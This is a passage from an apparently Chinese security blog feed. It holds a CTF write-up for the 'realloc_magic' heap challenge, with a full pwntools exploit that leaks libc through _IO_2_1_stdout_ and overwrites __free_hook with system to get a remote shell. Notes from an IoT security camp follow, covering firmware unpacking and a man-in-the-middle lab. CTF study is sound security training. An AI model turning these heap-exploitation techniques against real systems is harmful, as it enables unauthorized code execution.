class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(realloc_ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ba</code>这个函数呢，就是把<code>realloc_ptr</code>清零，并且只能用一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ba</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( lock )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  lock = <span class="number">1</span>;</span><br><span class="line">  realloc_ptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-解题思路-4"><a href="#0x02-解题思路-4" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>首先此程序不存在<code>show</code>函数，所以肯定是要打<code>IO_2_1_stdout</code>来泄露<code>libc</code>的，既然要打<code>IO_2_1_stdout</code>，那又得整出个<code>unsorted bin</code>指向<code>main_arena + 88</code>，并且要产生堆叠来修改<code>main_arena + 88</code>后两个字节，同时需要爆破1位，概率为1/16，泄露<code>libc</code>的具体细节在<a href="https://zyen12138.github.io/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/">_IO_FILE攻击</a>里面，那么又因为这是<code>libc-2.27</code>的题目，所以要获得<code>unsorted bin</code>肯定得先填满<code>tache</code>，所以完整思路如下：</p><ol><li><code>free</code>同一个块7次填满<code>tache</code>，再<code>free</code>一次进入<code>unsorted bin</code>：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">[free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] </span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>由于本地的<code>libc</code>打了补丁不能<code>double free</code>，所以加载远程的<code>libc</code>，远程的<code>libc</code>又没有调试符号….只能<code>vmmap</code>查看堆的起始位置，看到<code>0x000055ff8d55b2e0</code>这个堆块的<code>fd</code>和<code>bk</code>变成了<code>main_arena+88</code>的位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/100gx 0x55ff8d55b000</span><br><span class="line">0x55ff8d55b000:0x00000000000000000x0000000000000251</span><br><span class="line">0x55ff8d55b010:0x00010000000000000x0700000000000100</span><br><span class="line">0x55ff8d55b020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b030:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b050:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b080:0x000055ff8d55b2600x0000000000000000</span><br><span class="line">0x55ff8d55b090:0x00000000000000000x000055ff8d55b3f0</span><br><span class="line">0x55ff8d55b0a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b0b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b0c0:0x00000000000000000x000055ff8d55b2e0</span><br><span class="line">0x55ff8d55b0d0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br><span class="line">0x55ff8d55b240:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b250:0x00000000000000000x0000000000000081</span><br><span class="line">0x55ff8d55b260:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b270:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b280:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b290:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55ff8d55b2d0:0x00000000000000000x0000000000000111</span><br><span class="line">0x55ff8d55b2e0:0x00007f5ca1575ca00x00007f5ca1575ca0</span><br><span class="line">0x55ff8d55b2f0:0x00000000000000000x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>接着申请0x70的大小，由于它比之前的<code>realloc_ptr</code>的堆块要大（之前为0），所以它会从<code>tache</code>找，发现之前有个0x70的堆块，就直接分配出去了，紧接着又分配了0x180的堆块，由于它还是比之前的<code>realloc_ptr</code>的堆块要大（之前为0x70），所以它将扩大之前的0x70，也就是把0x100这个堆块给包含进来了，这个0x100的堆块再之前可是包着<code>main_arena+88</code>的指针的，也就是说，我们可以写<code>main_arena+88</code>的指针了！（修改chunk大小的原理还不是很清楚….，后面爆破再也没爆破出来，所以没调试出来，哭了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x180</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x41</span>)+p8(<span class="number">0x60</span>)+p8(<span class="number">0x87</span>))</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55e2f303a250:0x00000000000000000x0000000000000191</span><br><span class="line">0x55e2f303a260:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a270:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a280:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a290:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2a0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2b0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2c0:0x63636363636363630x6363636363636363</span><br><span class="line">0x55e2f303a2d0:0x63636363636363630x0000000000000041</span><br><span class="line">0x55e2f303a2e0:0x00007fcdef0a87600x00007fcdefce2ca0</span><br><span class="line">0x55e2f303a2f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>此时申请0x0的大小会把之前0x180的大小给<code>free</code>掉，在<code>bin</code>中就会出现<code>0x55e2f303a2e0 -&gt; 0x00007fcdef0a8760</code>的链表然后，再申请两次0x100，就能修改<code>IO_2_1_stdout</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0,&#x27;&#x27;)</span><br><span class="line">add(0x100,&#x27;a&#x27;)</span><br><span class="line">add(0,&#x27;&#x27;)</span><br><span class="line">add(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))</span><br></pre></td></tr></table></figure><p>顺利泄露出<code>libc</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(io.recvuntil(&quot;\x7f&quot;,timeout=0.1[-6:].ljust(8,&#x27;\x00&#x27;))-0x3e82a0</span><br></pre></td></tr></table></figure><p>清空<code>realloc_ptr</code>就可以再来一次，这次就是把<code>main_arena+88</code>改成<code>free_hook</code>，然后往<code>free_hook</code>里面写<code>system</code>，至于为什么不用<code>one_gadget</code>，因为没有<code>malloc_hook</code>来调整栈帧，所以用<code>system</code>来<code>getshell</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(&#x27;666&#x27;)</span><br></pre></td></tr></table></figure><h4 id="0x03-完整EXP-6"><a href="#0x03-完整EXP-6" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot;, 25009)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./roarctf_2019_realloc_magic&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf_2019_realloc_magic&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content?&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    [free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment">#fill tcache</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#to unsortbin fd-&gt;arena</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x180</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x61</span>)+p8(<span class="number">0x60</span>)+p8(<span class="number">0x87</span>))<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0x58</span>))<span class="comment">#get _IO_2_1_stdout_  change flag and write_base</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get_libc</span></span><br><span class="line">    libc_base = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">0.1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3e82a0</span></span><br><span class="line">    <span class="keyword">if</span> libc_base == -<span class="number">0x3e82a0</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[* ]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># one_gadget=libc_base + 0x4f322</span></span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x120</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x170</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    [free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment">#fill tcache</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#to unsortbin fd-&gt;arena</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x120</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x260</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x128</span>+p64(<span class="number">0x41</span>)+p64(free_hook-<span class="number">8</span>))<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">    free()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25510</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x04-总结-3"><a href="#0x04-总结-3" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p><code>realloc</code>函数的一些特点，才导致这道题目变得十分的特殊，当不对它<code>free</code>就直接再次调用<code>realloc</code>函数就会导致前一个堆块永远无法进入<code>bin</code>里面，这是需要十分注意的点！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HWS硬件安全在线夏令营总结</title>
      <link href="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/"/>
      <url>/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h3><p>IOT是一个完整的信息系统，它包括软件和硬件两个组成部分，也PC不同的是，他们主要的业务就是操控硬件设备，其实IOT在每个人眼中都有不同的看法，人云亦云，对于软件开发者来说，IOT是业务，是设备的的业务实现，对于网络安全从业者来说，就是硬件设备，它硬件上有我们可攻击的漏洞</p><p>那么一个完整的IOT设备它应该有云端，设备硬件端 ，APP端，三个切入点</p><p>通常我们都是从设备端或者是APP端来进行攻击，那么关注设备端就是关注这个设备从开始到启动的全过程，就是bios -&gt; bootloader -&gt; 操作系统 -&gt; init.d -&gt; 业务</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411916974.png" class=""><h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>所谓”固件”，顾名思义，就是”固化在设备中的软件”，通常而言<strong>指的是 Flash 中被固化、执行固定功能的软件</strong>，需要注意的是固件是软件，是嵌入式设备中会被CPU所执行的代码</p><h4 id="固件的获取"><a href="#固件的获取" class="headerlink" title="固件的获取"></a>固件的获取</h4><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633411933096.png" class=""><h4 id="固件的解包"><a href="#固件的解包" class="headerlink" title="固件的解包"></a>固件的解包</h4><p>固件的解包一般有两种方法，binwalk和mount，binwalk在大多数情况下都管用，binwalk不管用的时候，mount可能会有奇效</p><p><strong>binwalk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me *.bin <span class="comment">#递归提取</span></span><br><span class="line">binwalk -A *.bin <span class="comment">#识别架构</span></span><br><span class="line">binwalk -E *.bin <span class="comment">#熵值分析</span></span><br></pre></td></tr></table></figure><p><strong>mount</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir file_systems</span><br><span class="line">sudo mount ./rootfs.img file_systems</span><br></pre></td></tr></table></figure><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>逆向分析的思路都是通用的</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411945172.png" class=""><h6 id="分析攻击面"><a href="#分析攻击面" class="headerlink" title="分析攻击面"></a>分析攻击面</h6><p>输入就意味着存在着接口函数，既然有接口函数那就必然有实现的代码和相对应的硬件，但是需要注意的，我们分析IOT设备不是简单的read之类的输入，还包括很多物理世界的输入，比如USB口，网口等，这些输入都有可能成为一个IOT设备的攻击入口，所以多发散一下思维，没有什么是不可能的！</p><p>对于软件层面的分析，那分为两种情况，有shell和无shell，有shell，很好办了，查看一些它开启了哪些进程哪些服务，哪些端口，没有shell，就只能对它进行端口扫描了</p><h6 id="定位程序"><a href="#定位程序" class="headerlink" title="定位程序"></a>定位程序</h6><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633411966466.png" class=""><p>在前面我们通过收集IOT设备的信息后，我们就可以通过分析攻击的入口来定位，一般在查找的时候都是去查找厂商的二进制文件或者开源组件的漏洞</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一天的知识点还是比较基础的，从不同的角度阐述了IOT究竟是个什么玩意儿，它对于HWS来说有什么意义，对于不同的从业者来说又有什么意思，课程的后半部分就是在围绕着IOT中的一大基本要素——固件，所有的分析都是基于固件来分析的，所以说固件的提取和分析都是很关键的一环！拿到固件就像拿到IOT设备的蓝图，而后续的漏洞挖掘就是在探索地图当中那些神秘而又未知的宝藏！</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>流量分析中最重要的四个步骤”收，发，断，改”</p><p>收和发是流量中最基本的操作，在PWN中通过发送一些畸形的数据来使得程序的执行发生了一下非预期的结果，最终导致我们能够去做一些正常的操作所不能实现的东西</p><p>流量就像水流一样，流经哪里就可能会在某个地方留下一定的痕迹，如果我们在”水流”流动的过程中进行抓取，当然想要抓取更多更全面的信息，我们就得在”水流”的主干道上进行抓取，也就是在路由器干路侧放置抓包工具</p><p>所以当我们能够抓取到一些流量的时候，那必然可以进行断和改，就像我把”水流”中的水盛一碗上来，盛上来就是一个断的操作，接下来我在换一碗水再倒回去，便是改的操作</p><p>但是并不是所有的通信信道我们都可以去接入的，有一些信道是在内网当中的，我们不可能直接套用PWN的那一套，io.sendline()和io.recvuntil()，这不太可能做到，那就需要通过一下内网的边界进行介入，将外网的设备日穿，使得我们可以进入内网通信，这是一种外接内的情况，那还有一种内接外的情况，就是通过钓鱼邮件或者mqtt消息队列来进入内网通信，不多说，都是边界渗透的事</p><p>刚刚将的是现实生活中的抓，但我们不可能真的用手在空气中抓取通信报文，不太现实，所以一般我们都会通过树莓派刷上openwrt的代码，让树莓派变成一个小型的路由器，连接到干路进行抓取数据包</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411985853.png" class=""><p>这里复现一下课上的实验——基于UDP信道的中间人攻击</p><p>先看看nc的参数</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411997048.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l<span class="comment">#监听模式，就是把nc当做一个server来看待，等待连接请求</span></span><br><span class="line">-p[port]<span class="comment">#端口号，可自定义</span></span><br><span class="line">-u<span class="comment">#使用UDP，默认是TCP</span></span><br><span class="line">-o[file]<span class="comment">#将传输过程中的数据以十六进制的形式保持到[file]中</span></span><br><span class="line">-s[addr]<span class="comment">#发送数据包的目的IP地址</span></span><br><span class="line">-w[time]<span class="comment">#设置超时的时间</span></span><br><span class="line">-z<span class="comment">#没有任何输入输出信息，用于扫描</span></span><br></pre></td></tr></table></figure><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>软件被运行在调试底座，也就是gdbserver并在上面暴露出调试接口给调试器，也就是gdb，我们通过gdb发送一些调试命令对软件进行调试</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412024242.png" class=""><p>既然要进行调试，那必然要暴露接口出来我们才可以进行调试，而这个接口也有很多种，UART，JTAG（Joint Test Action Group（联合测试行为组织，Coresight等等</p><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h3><p>交叉编译何为”交叉”？交叉就指的是不同的平台，就比如说我在<code>X86-64</code>平台下编译一个<code>ARM</code>架构的程序，就称之为交叉编译，与此对应的就是本地编译，可是为啥会有交叉编译这个概念呢？你本地编译不行吗？我还要再其他平台上编译，然后再送到你的平台上，费这么大劲干嘛？确实不行，由于嵌入式系统本身的原因，它所拥有的资源极其有限，它自己运行程序都够呛了，还给你编译，显然不太现实，所以才有了交叉编译</p><p>我们进行交叉编译的时候会用一个叫<code>arm-linux-gnueabi-gcc</code>，这包含了四个部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arch [-vendor] [-kernel] [-system] [-language]</span><br><span class="line"></span><br><span class="line">-arch <span class="comment">#架构，编译出来是用于那个平台</span></span><br><span class="line">-vendor <span class="comment">#工具链的提供厂商，由厂商定义</span></span><br><span class="line">-kernel <span class="comment">#目标的操作系统</span></span><br><span class="line">-system <span class="comment">#所用的库函数,其中gnu等价于glibc+oabi,gnueabi等价于glibc+eabi</span></span><br><span class="line">-language <span class="comment">#编译语言，可以是gcc和g++</span></span><br></pre></td></tr></table></figure><p> 看似这一个很高级的命令就可以编译出来程序，但是其本质还是gcc的那一套，某个编译的参数不同</p><p>而<code>gcc</code>本质是一个工具包，但是这个工具包不只是单纯的是一个个分散的工具，它里面的工具与工具之间会形成一个联系，也就是后面介绍的工具链，<code>gcc</code>就像一个老大，有很多小弟帮他做事情，在平时编译程序的时候我们只需要<code>gcc -o xxx xxx.c</code>，就完成了编译，看似简单的背后，<code>gcc</code>替我们做的事情却不简单，我们来看一下<code>gcc</code>编译程序的流程</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633412058794.png" class=""><p>编译的阶段一共分为四个阶段：</p><ul><li>预处理（Preprocess）</li><li>编译（Compile）</li><li>汇编（Assemble）</li><li>链接（Link）</li></ul><p>一个阶段一个阶段来看</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412080757.png" class=""><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/8-1633412103083.jpg" class=""><p>经过预处理之后，我们打开文件之后看到一些宏定义还有函数的定义，这时我们的文件大小也变的特别大，就是因为预处理把<code>include</code>的包全部解析进来了</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633412119601.png" class=""><img 